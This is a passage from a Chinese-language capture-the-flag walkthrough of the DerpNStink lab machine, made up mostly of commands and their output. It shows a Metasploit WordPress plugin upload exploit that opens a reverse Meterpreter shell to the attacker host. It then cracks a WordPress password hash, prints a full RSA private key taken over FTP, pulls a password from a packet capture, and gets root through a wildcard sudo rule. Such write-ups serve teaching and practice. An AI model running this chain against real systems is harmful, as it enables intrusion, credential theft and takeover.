   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.159.129  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WP SlideShow Gallery 1.4.6



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > set TARGETURI /weblog/
TARGETURI => /weblog/
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > show options

Module options (exploit/unix/webapp/wp_slideshowgallery_upload):

   Name         Current Setting   Required  Description
   ----         ---------------   --------  -----------
   Proxies                        no        A proxy chain of format type:host:port[,type:hos
                                            t:port][...]
   RHOSTS       192.168.159.136   yes       The target host(s), see https://docs.metasploit.
                                            com/docs/using-metasploit/basics/using-metasploi
                                            t.html
   RPORT        80                yes       The target port (TCP)
   SSL          false             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /weblog/          yes       The base path to the wordpress application
   VHOST        derpnstink.local  no        HTTP server virtual host
   WP_PASSWORD  admin             yes       Valid password for the provided username
   WP_USER      admin             yes       A valid username


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.159.129  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WP SlideShow Gallery 1.4.6



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > ruin
[-] Unknown command: ruin. Did you mean run? Run the help command for more details.
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > run

[*] Started reverse TCP handler on 192.168.159.129:4444
[*] Trying to login as admin
[*] Trying to upload payload
[*] Uploading payload
[*] Calling uploaded file zpvaixmu.php
[*] Sending stage (39927 bytes) to 192.168.159.136
[+] Deleted zpvaixmu.php
[*] Meterpreter session 1 opened (192.168.159.129:4444 -> 192.168.159.136:36512) at 2024-07-22 18:07:00 +0800

meterpreter >
```
也是成功利用上了

```
shell

后面接上python -c 'import pty; pty.spawn("/bin/bash")'

```
正常的id和uname -a 看一下权限和系统结构

后面提权
看了一下正在运行的
发现正在用root运行Mysql，所以可以尝试udf提权
```
</html/weblog/wp-content/uploads/slideshow-gallery$ ps -ef
ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 03:40 ?        00:00:01 /sbin/init
root         2     0  0 03:40 ?        00:00:00 [kthreadd]
root         3     2  0 03:40 ?        00:00:02 [ksoftirqd/0]
root         4     2  0 03:40 ?        00:00:00 [kworker/0:0]
root         5     2  0 03:40 ?        00:00:00 [kworker/0:0H]
root         7     2  0 03:40 ?        00:00:00 [rcu_sched]
root         8     2  0 03:40 ?        00:00:00 [rcu_bh]
root         9     2  0 03:40 ?        00:00:00 [migration/0]
root        10     2  0 03:40 ?        00:00:00 [watchdog/0]
root        11     2  0 03:40 ?        00:00:00 [kdevtmpfs]
root        12     2  0 03:40 ?        00:00:00 [netns]
root        13     2  0 03:40 ?        00:00:00 [perf]
root        14     2  0 03:40 ?        00:00:00 [khungtaskd]
root        15     2  0 03:40 ?        00:00:00 [writeback]
root        16     2  0 03:40 ?        00:00:00 [ksmd]
root        17     2  0 03:40 ?        00:00:00 [khugepaged]
root        18     2  0 03:40 ?        00:00:00 [crypto]
root        19     2  0 03:40 ?        00:00:00 [kintegrityd]
root        20     2  0 03:40 ?        00:00:00 [bioset]
root        21     2  0 03:40 ?        00:00:00 [kblockd]
root        22     2  0 03:40 ?        00:00:00 [ata_sff]
root        23     2  0 03:40 ?        00:00:00 [md]
root        24     2  0 03:40 ?        00:00:00 [devfreq_wq]
root        28     2  0 03:40 ?        00:00:00 [kswapd0]
root        29     2  0 03:40 ?        00:00:00 [vmstat]
root        30     2  0 03:40 ?        00:00:00 [fsnotify_mark]
root        31     2  0 03:40 ?        00:00:00 [ecryptfs-kthrea]
root        47     2  0 03:40 ?        00:00:00 [kthrotld]
root        48     2  0 03:40 ?        00:00:00 [acpi_thermal_pm]
root        49     2  0 03:40 ?        00:00:00 [bioset]
root        50     2  0 03:40 ?        00:00:00 [bioset]
root        52     2  0 03:40 ?        00:00:00 [bioset]
root        53     2  0 03:40 ?        00:00:00 [bioset]
root        54     2  0 03:40 ?        00:00:00 [bioset]
root        55     2  0 03:40 ?        00:00:00 [bioset]
root        56     2  0 03:40 ?        00:00:00 [bioset]
root        57     2  0 03:40 ?        00:00:00 [bioset]
root        58     2  0 03:40 ?        00:00:00 [bioset]
root        59     2  0 03:40 ?        00:00:00 [bioset]
root        60     2  0 03:40 ?        00:00:00 [bioset]
root        61     2  0 03:40 ?        00:00:00 [bioset]
root        62     2  0 03:40 ?        00:00:00 [bioset]
root        63     2  0 03:40 ?        00:00:00 [bioset]
root        64     2  0 03:40 ?        00:00:00 [bioset]
root        65     2  0 03:40 ?        00:00:00 [bioset]
root        66     2  0 03:40 ?        00:00:00 [bioset]
root        67     2  0 03:40 ?        00:00:00 [bioset]
root        68     2  0 03:40 ?        00:00:00 [bioset]
root        69     2  0 03:40 ?        00:00:00 [bioset]
root        70     2  0 03:40 ?        00:00:00 [bioset]
root        71     2  0 03:40 ?        00:00:00 [bioset]
root        72     2  0 03:40 ?        00:00:00 [bioset]
root        73     2  0 03:40 ?        00:00:00 [bioset]
root        74     2  0 03:40 ?        00:00:00 [scsi_eh_0]
root        75     2  0 03:40 ?        00:00:00 [scsi_tmf_0]
root        76     2  0 03:40 ?        00:00:00 [scsi_eh_1]
root        77     2  0 03:40 ?        00:00:00 [scsi_tmf_1]
root        79     2  0 03:40 ?        00:00:00 [kworker/0:2]
root        80     2  0 03:40 ?        00:00:00 [ipv6_addrconf]
root        94     2  0 03:40 ?        00:00:00 [deferwq]
root        95     2  0 03:40 ?        00:00:00 [charger_manager]
root       149     2  0 03:40 ?        00:00:00 [scsi_eh_2]
root       150     2  0 03:40 ?        00:00:00 [scsi_tmf_2]
root       151     2  0 03:40 ?        00:00:00 [scsi_eh_3]
root       152     2  0 03:40 ?        00:00:00 [mpt_poll_0]
root       153     2  0 03:40 ?        00:00:00 [scsi_tmf_3]
root       154     2  0 03:40 ?        00:00:00 [mpt/0]
root       155     2  0 03:40 ?        00:00:00 [scsi_eh_4]
root       156     2  0 03:40 ?        00:00:00 [scsi_tmf_4]
root       157     2  0 03:40 ?        00:00:00 [scsi_eh_5]
root       158     2  0 03:40 ?        00:00:00 [scsi_tmf_5]
root       159     2  0 03:40 ?        00:00:00 [kpsmoused]
root       160     2  0 03:40 ?        00:00:00 [scsi_eh_6]
root       161     2  0 03:40 ?        00:00:00 [scsi_tmf_6]
root       162     2  0 03:40 ?        00:00:00 [scsi_eh_7]
root       163     2  0 03:40 ?        00:00:00 [scsi_tmf_7]
root       164     2  0 03:40 ?        00:00:00 [scsi_eh_8]
root       165     2  0 03:40 ?        00:00:00 [scsi_tmf_8]
root       166     2  0 03:40 ?        00:00:00 [scsi_eh_9]
root       167     2  0 03:40 ?        00:00:00 [scsi_tmf_9]
root       168     2  0 03:40 ?        00:00:00 [scsi_eh_10]
root       169     2  0 03:40 ?        00:00:00 [scsi_tmf_10]
root       170     2  0 03:40 ?        00:00:00 [scsi_eh_11]
root       171     2  0 03:40 ?        00:00:00 [scsi_tmf_11]
root       172     2  0 03:40 ?        00:00:00 [scsi_eh_12]
root       173     2  0 03:40 ?        00:00:00 [scsi_tmf_12]
root       174     2  0 03:40 ?        00:00:00 [scsi_eh_13]
root       175     2  0 03:40 ?        00:00:00 [scsi_tmf_13]
root       176     2  0 03:40 ?        00:00:00 [scsi_eh_14]
root       177     2  0 03:40 ?        00:00:00 [scsi_tmf_14]
root       178     2  0 03:40 ?        00:00:00 [scsi_eh_15]
root       179     2  0 03:40 ?        00:00:00 [scsi_tmf_15]
root       180     2  0 03:40 ?        00:00:00 [scsi_eh_16]
root       181     2  0 03:40 ?        00:00:00 [scsi_tmf_16]
root       182     2  0 03:40 ?        00:00:00 [scsi_eh_17]
root       183     2  0 03:40 ?        00:00:00 [scsi_tmf_17]
root       184     2  0 03:40 ?        00:00:00 [scsi_eh_18]
root       185     2  0 03:40 ?        00:00:00 [scsi_tmf_18]
root       186     2  0 03:40 ?        00:00:00 [scsi_eh_19]
root       187     2  0 03:40 ?        00:00:00 [scsi_tmf_19]
root       188     2  0 03:40 ?        00:00:00 [scsi_eh_20]
root       189     2  0 03:40 ?        00:00:00 [scsi_tmf_20]
root       190     2  0 03:40 ?        00:00:00 [scsi_eh_21]
root       191     2  0 03:40 ?        00:00:00 [scsi_tmf_21]
root       192     2  0 03:40 ?        00:00:00 [scsi_eh_22]
root       193     2  0 03:40 ?        00:00:00 [scsi_tmf_22]
root       194     2  0 03:40 ?        00:00:00 [scsi_eh_23]
root       195     2  0 03:40 ?        00:00:00 [scsi_tmf_23]
root       196     2  0 03:40 ?        00:00:00 [scsi_eh_24]
root       197     2  0 03:40 ?        00:00:00 [scsi_tmf_24]
root       198     2  0 03:40 ?        00:00:00 [scsi_eh_25]
root       199     2  0 03:40 ?        00:00:00 [scsi_tmf_25]
root       200     2  0 03:40 ?        00:00:00 [scsi_eh_26]
root       201     2  0 03:40 ?        00:00:00 [scsi_tmf_26]
root       202     2  0 03:40 ?        00:00:00 [scsi_eh_27]
root       203     2  0 03:40 ?        00:00:00 [scsi_tmf_27]
root       204     2  0 03:40 ?        00:00:00 [scsi_eh_28]
root       205     2  0 03:40 ?        00:00:00 [scsi_tmf_28]
root       206     2  0 03:40 ?        00:00:00 [scsi_eh_29]
root       207     2  0 03:40 ?        00:00:00 [scsi_tmf_29]
root       208     2  0 03:40 ?        00:00:00 [scsi_eh_30]
root       209     2  0 03:40 ?        00:00:00 [scsi_tmf_30]
root       210     2  0 03:40 ?        00:00:00 [scsi_eh_31]
root       211     2  0 03:40 ?        00:00:00 [scsi_tmf_31]
root       236     2  0 03:40 ?        00:00:00 [kworker/u16:29]
root       239     2  0 03:40 ?        00:00:00 [scsi_eh_32]
root       240     2  0 03:40 ?        00:00:00 [scsi_tmf_32]
root       241     2  0 03:40 ?        00:00:00 [bioset]
root       259     2  0 03:40 ?        00:00:00 [bioset]
root       264     2  0 03:40 ?        00:00:00 [kworker/0:1H]
root       273     2  0 03:40 ?        00:00:00 [jbd2/sda1-8]
root       274     2  0 03:40 ?        00:00:00 [ext4-rsv-conver]
root       410     1  0 03:40 ?        00:00:00 upstart-udev-bridge --daemon
root       419     1  0 03:40 ?        00:00:00 /lib/systemd/systemd-udevd --dae
message+   488     1  0 03:40 ?        00:00:00 dbus-daemon --system --fork
root       564     1  0 03:40 ?        00:00:00 /lib/systemd/systemd-logind
root       565     1  0 03:40 ?        00:00:00 /usr/sbin/bluetoothd
syslog     580     1  0 03:40 ?        00:00:00 rsyslogd
root       581     2  0 03:40 ?        00:00:00 [krfcommd]
root       589     1  0 03:40 ?        00:00:00 /usr/sbin/cupsd -f
avahi      592     1  0 03:40 ?        00:00:00 avahi-daemon: running [DeRPnStiN
avahi      593   592  0 03:40 ?        00:00:00 avahi-daemon: chroot helper
root       623     2  0 03:40 ?        00:00:00 [ttm_swap]
root       627     1  0 03:40 ?        00:00:00 upstart-file-bridge --daemon
root       753     1  0 03:40 ?        00:00:00 /usr/sbin/ModemManager
root       771     1  0 03:40 ?        00:00:01 NetworkManager
root       775     1  0 03:40 ?        00:00:00 /usr/sbin/cups-browsed
root       782     1  0 03:40 ?        00:00:00 /usr/lib/policykit-1/polkitd --n
root       822     1  0 03:40 ?        00:00:00 upstart-socket-bridge --daemon
root       824   771  0 03:40 ?        00:00:00 /sbin/dhclient -d -sf /usr/lib/N
root       976     1  0 03:40 tty4     00:00:00 /sbin/getty -8 38400 tty4
root       980     1  0 03:40 tty5     00:00:00 /sbin/getty -8 38400 tty5
root       987     1  0 03:40 tty2     00:00:00 /sbin/getty -8 38400 tty2
root       988     1  0 03:40 tty3     00:00:00 /sbin/getty -8 38400 tty3
root       992     1  0 03:40 tty6     00:00:00 /sbin/getty -8 38400 tty6
root      1055     1  0 03:40 ?        00:00:00 /usr/sbin/sshd -D
root      1057     1  0 03:40 ?        00:00:00 cron
root      1059     1  0 03:40 ?        00:00:00 /usr/sbin/vsftpd
whoopsie  1067     1  0 03:40 ?        00:00:00 whoopsie
root      1076     1  0 03:40 ?        00:00:00 acpid -c /etc/acpi/events -s /va
kernoops  1105     1  0 03:40 ?        00:00:00 /usr/sbin/kerneloops
mysql     1113     1  0 03:40 ?        00:00:04 /usr/sbin/mysqld
root      1144     1  0 03:40 ?        00:00:07 /usr/bin/vmtoolsd
root      1179     1  0 03:40 ?        00:00:00 lightdm
root      1217  1179  0 03:40 tty7     00:00:00 /usr/lib/xorg/Xorg -core :0 -sea
root      1220     1  0 03:40 ?        00:00:00 /usr/lib/accountsservice/account
root      1255     1  0 03:40 ?        00:00:00 /usr/sbin/apache2 -k start
nobody    1271   771  0 03:40 ?        00:00:00 /usr/sbin/dnsmasq --no-resolv --
root      1277  1179  0 03:40 ?        00:00:00 lightdm --session-child 16 19
root      1286     2  0 03:40 ?        00:00:00 [kauditd]
lightdm   1291  1277  0 03:40 ?        00:00:00 /bin/sh /usr/lib/lightdm/lightdm
lightdm   1296     1  0 03:40 ?        00:00:00 //bin/dbus-daemon --fork --print
lightdm   1297  1291  0 03:40 ?        00:00:00 /usr/sbin/unity-greeter
lightdm   1299     1  0 03:40 ?        00:00:00 /usr/lib/at-spi2-core/at-spi-bus
lightdm   1334  1299  0 03:40 ?        00:00:00 /bin/dbus-daemon --config-file=/
lightdm   1345     1  0 03:40 ?        00:00:00 /usr/lib/at-spi2-core/at-spi2-re
lightdm   1369     1  0 03:40 ?        00:00:00 /usr/lib/gvfs/gvfsd
lightdm   1378     1  0 03:40 ?        00:00:00 /usr/lib/gvfs/gvfsd-fuse /run/us
lightdm   1467     1  0 03:40 ?        00:00:00 /usr/lib/dconf/dconf-service
root      1478  1179  0 03:40 ?        00:00:00 lightdm --session-child 12 19
lightdm   1481     1  0 03:40 ?        00:00:00 init --user --startup-event indi
lightdm   1483     1  0 03:40 ?        00:00:00 nm-applet
lightdm   1486     1  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/indicato
lightdm   1488  1481  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/indicato
lightdm   1491  1481  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/indicato
lightdm   1494     1  0 03:40 ?        00:00:00 /usr/lib/unity-settings-daemon/u
lightdm   1496  1481  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/indicato
lightdm   1499  1481  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/indicato
lightdm   1511  1481  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/indicato
root      1529     1  0 03:40 tty1     00:00:00 /sbin/getty -8 38400 tty1
root      1532     1  0 03:40 ?        00:00:00 /usr/lib/upower/upowerd
lightdm   1534  1481  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/indicato
lightdm   1538  1481  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/indicato
lightdm   1571  1481  0 03:40 ?        00:00:00 /usr/bin/pulseaudio --start --lo
rtkit     1573     1  0 03:40 ?        00:00:00 /usr/lib/rtkit/rtkit-daemon
lightdm   1600     1  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/notify-o
lightdm   1854     1  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/gconf/gc
colord    1872     1  0 03:40 ?        00:00:00 /usr/lib/colord/colord
www-data  1968  1255  0 03:47 ?        00:00:21 /usr/sbin/apache2 -k start
www-data  2025  1255  0 03:57 ?        00:00:19 /usr/sbin/apache2 -k start
www-data  2029  1255  0 03:57 ?        00:00:18 /usr/sbin/apache2 -k start
www-data  2031  1255  0 03:57 ?        00:00:16 /usr/sbin/apache2 -k start
www-data  2035  1255  0 03:57 ?        00:00:19 /usr/sbin/apache2 -k start
www-data  2067  1255  0 04:37 ?        00:00:09 /usr/sbin/apache2 -k start
www-data  2080  1255  0 04:41 ?        00:00:10 /usr/sbin/apache2 -k start
www-data  2081  1255  0 04:41 ?        00:00:10 /usr/sbin/apache2 -k start
www-data  2082  1255  0 04:41 ?        00:00:10 /usr/sbin/apache2 -k start
root      2083     2  0 04:42 ?        00:00:00 [kworker/u16:0]
www-data  2084  1255  0 04:45 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  2142  2031  0 06:07 ?        00:00:00 sh -c /bin/sh
www-data  2143  2142  0 06:07 ?        00:00:00 /bin/sh
www-data  2144  2143  0 06:07 ?        00:00:00 python -c import pty; pty.spawn(
www-data  2145  2144  0 06:07 pts/1    00:00:00 /bin/bash
www-data  2150  2145  0 06:08 pts/1    00:00:00 ps -ef
</html/weblog/wp-content/uploads/slideshow-gallery$ ls
```

配置文件中发现了mysql的账号密码
```
</html/weblog/wp-content/uploads/slideshow-gallery$ cd /var/www/html/
cd /var/www/html/
www-data@DeRPnStiNK:/var/www/html$ ls
ls
css       index.html  php         stinky.png  weblog
derp.png  js          robots.txt  temporary   webnotes
www-data@DeRPnStiNK:/var/www/html$ cd weblog
cd weblog
www-data@DeRPnStiNK:/var/www/html/weblog$ ls
ls
index.php        wp-blog-header.php    wp-cron.php        wp-mail.php
license.txt      wp-comments-post.php  wp-includes        wp-settings.php
readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php
wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php
wp-admin         wp-content            wp-login.php       xmlrpc.php
www-data@DeRPnStiNK:/var/www/html/weblog$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

```
查看发现不可以任意上传下载文件，只能在指定目录下上传下载文件，不可以使用udf

```
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show global variables like 'secure%';
show global variables like 'secure%';
+------------------+-----------------------+
| Variable_name    | Value                 |
+------------------+-----------------------+
| secure_auth      | OFF                   |
| secure_file_priv | /var/lib/mysql-files/ |
+------------------+-----------------------+
2 rows in set (0.00 sec)

mysql>
```

之前不是发现一个phpmyadmin，我们用账号密码登录 进去，在里面的wp-posts发现flag2

在wp_users表中发现另一个用户unclestinky
和hash加密过后的密码
```
$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41
```
写进1.txt中，用john打
```
echo '$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41' > 1.txt
john 1.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
~~rockyou.txt可能是还是gz形态，如果出现了/usr/share/wordlists/rockyou.txt: No such file or directory，过去解压就好~~


理论是能解开的，我直接拿wp的了
unclestinky/wedgie57

```
┌──(kali㉿kali)-[~]
└─$ john 1.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
wedgie57         (?)
1g 0:00:02:37 DONE (2024-07-22 18:31) 0.006347g/s 17749p/s 17749c/s 17749C/s wedner12..wed61299
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```
事实上确实解开了


在home里面发现两个账号密码，
```
www-data@DeRPnStiNK:/home$ ls
ls
mrderp  stinky

```

ssh登不上，用21的ftp试了试，stinky/wedgie57可以

ftp登陆成功，在files/ssh/ssh/ssh/ssh/ssh/ssh/ssh/里面有一个key.txt，
get下载下下来发现是密钥，用ssh登录

```

┌──(kali㉿kali)-[~]
└─$ ssh -i key.txt stinky@192.168.159.136
Ubuntu 14.04.5 LTS


                       ,~~~~~~~~~~~~~..
                       '  Derrrrrp  N  `
        ,~~~~~~,       |    Stink      |
       / ,      \      ',  ________ _,"
      /,~|_______\.      \/
     /~ (__________)
    (*)  ; (^)(^)':
        =;  ____  ;
          ; """"  ;=
   {"}_   ' '""' ' _{"}
   \__/     >  <   \__/
      \    ,"   ",  /
       \  "       /"
          "      "=
           >     <
          ="     "-
          -`.   ,'
                -
            `--'

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for 'key.txt' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "key.txt": bad permissions
stinky@192.168.159.136: Permission denied (publickey).

┌──(kali㉿kali)-[~]
└─$ chmod 600
chmod: "600" 后缺少操作对象
请尝试执行 "chmod --help" 来获取更多信息。

┌──(kali㉿kali)-[~]
└─$ chmod 600 key.txt

┌──(kali㉿kali)-[~]
└─$ ssh -i key.txt stinky@192.168.159.136
Ubuntu 14.04.5 LTS


                       ,~~~~~~~~~~~~~..
                       '  Derrrrrp  N  `
        ,~~~~~~,       |    Stink      |
       / ,      \      ',  ________ _,"
      /,~|_______\.      \/
     /~ (__________)
    (*)  ; (^)(^)':
        =;  ____  ;
          ; """"  ;=
   {"}_   ' '""' ' _{"}
   \__/     >  <   \__/
      \    ,"   ",  /
       \  "       /"
          "      "=
           >     <
          ="     "-
          -`.   ,'
                -
            `--'

sign_and_send_pubkey: no mutual signature supported
stinky@192.168.159.136: Permission denied (publickey).

┌──(kali㉿kali)-[~]
└─$ ssh -i key.txt stinky@192.168.159.136
Ubuntu 14.04.5 LTS


                       ,~~~~~~~~~~~~~..
                       '  Derrrrrp  N  `
        ,~~~~~~,       |    Stink      |
       / ,      \      ',  ________ _,"
      /,~|_______\.      \/
     /~ (__________)
    (*)  ; (^)(^)':
        =;  ____  ;
          ; """"  ;=
   {"}_   ' '""' ' _{"}
   \__/     >  <   \__/
      \    ,"   ",  /
       \  "       /"
          "      "=
           >     <
          ="     "-
          -`.   ,'
                -
            `--'

sign_and_send_pubkey: no mutual signature supported
stinky@192.168.159.136: Permission denied (publickey).

┌──(kali㉿kali)-[~]
└─$ cat key.txt
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4
2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO
uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn
AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f
5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB
LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc
nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD
D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4
ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk
Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq
YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0
DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X
VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu
Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7
VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc
fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br
7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab
L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q
cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8
gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7
RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1
14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh1W
pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz
UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA
a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
-----END RSA PRIVATE KEY-----

┌──(kali㉿kali)-[~]
└─$ ssh -i key.txt stinky@192.168.159.136 -o PubkeyAcceptedKeyTypes=+ssh-rsa
Ubuntu 14.04.5 LTS


                       ,~~~~~~~~~~~~~..
                       '  Derrrrrp  N  `
        ,~~~~~~,       |    Stink      |
       / ,      \      ',  ________ _,"
      /,~|_______\.      \/
     /~ (__________)
    (*)  ; (^)(^)':
        =;  ____  ;
          ; """"  ;=
   {"}_   ' '""' ' _{"}
   \__/     >  <   \__/
      \    ,"   ",  /
       \  "       /"
          "      "=
           >     <
          ="     "-
          -`.   ,'
                -
            `--'

Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

331 packages can be updated.
231 updates are security updates.

Last login: Fri Jan 28 02:40:43 2022 from 192.168.4.55
stinky@DeRPnStiNK:~$
```
第一次提示权限不够，然后chmod 600给权限，第二次说权限太开放

~~所以是封闭还是开饭到底，怒~~

在后面加
-o PubkeyAcceptedKeyTypes=+ssh-rsa
```
stinky@DeRPnStiNK:~$ ls
Desktop  Documents  Downloads  ftp
stinky@DeRPnStiNK:~$ pwd
/home/stinky
stinky@DeRPnStiNK:~$ cd /home/stinky
stinky@DeRPnStiNK:~$ ls
Desktop  Documents  Downloads  ftp
stinky@DeRPnStiNK:~$ cd Desktop/
stinky@DeRPnStiNK:~/Desktop$ ls
flag.txt
stinky@DeRPnStiNK:~/Desktop$ cat f*
flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
stinky@DeRPnStiNK:~/Desktop$
```


之前在ftp的时候,network-logs目录下还有一个文件，中有一段对话，提示说修改密码的时候，进行了抓包

（忘了截图了，就直接拿wp的）

https://i-blog.csdnimg.cn/blog_migrate/d8f33c1bf0d19f6c77ee22d6d45adc0e.png

```
──(kali㉿kali)-[~]
└─$ scp -i key.txt -o PubkeyAcceptedKeyTypes=+ssh-rsa  stinky@192.168.159.136:/home/stinky/Documents/derpissues.pcap /home/kali
Ubuntu 14.04.5 LTS


                       ,~~~~~~~~~~~~~..
                       '  Derrrrrp  N  `
        ,~~~~~~,       |    Stink      |
       / ,      \      ',  ________ _,"
      /,~|_______\.      \/
     /~ (__________)
    (*)  ; (^)(^)':
        =;  ____  ;
          ; """"  ;=
   {"}_   ' '""' ' _{"}
   \__/     >  <   \__/
      \    ,"   ",  /
       \  "       /"
          "      "=
           >     <
          ="     "-
          -`.   ,'
                -
            `--'

derpissues.pcap                                             100% 4289KB  25.9MB/s   00:00


```
用scp下载下来

wirkshark打开
[![pk74ZMd.png](https://s21.ax1x.com/2024/07/22/pk74ZMd.png)](https://imgse.com/i/pk74ZMd)

发现password

ssh登录mrderp/derpderpderpderpderpderpderp

Home文件夹下有一个helpdesk.logh，里面提示了
要去https://pastebin.com/RzK9WfGw

然后就简单了

照着提示走访问https://pastebin.com/RzK9WfGw

[![pk74JMj.png](https://s21.ax1x.com/2024/07/22/pk74JMj.png)](https://imgse.com/i/pk74JMj)

获得mrderp ALL=(ALL) /home/mrderp/binaries/derpy提示

这是考查的一个linux sudo命令知识点，

大概意思：

允许mrderp用户在主机上以root用户权限读写执行/home/mrderp/binaries/
目录下derpy开头的文件

sudo -l 看权限


```
mrderp@DeRPnStiNK:~$ sudo -l
[sudo] password for mrderp:
Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
mrderp@DeRPnStiNK:~$ cd /home/mrderp
mrderp@DeRPnStiNK:~$ mkdir binaries
mkdir: cannot create directory ‘binaries’: File exists
mrderp@DeRPnStiNK:~$ ls
binaries  Desktop  Documents  Downloads
mrderp@DeRPnStiNK:~$ cd binaries/
mrderp@DeRPnStiNK:~/binaries$ ls
dayu.sh  derpy.sh
mrderp@DeRPnStiNK:~/binaries$ echo '/bin/bash' > derpy.sh
mrderp@DeRPnStiNK:~/binaries$ chmod 777 derpy.sh
mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh
root@DeRPnStiNK:~/binaries# ls
dayu.sh  derpy.sh
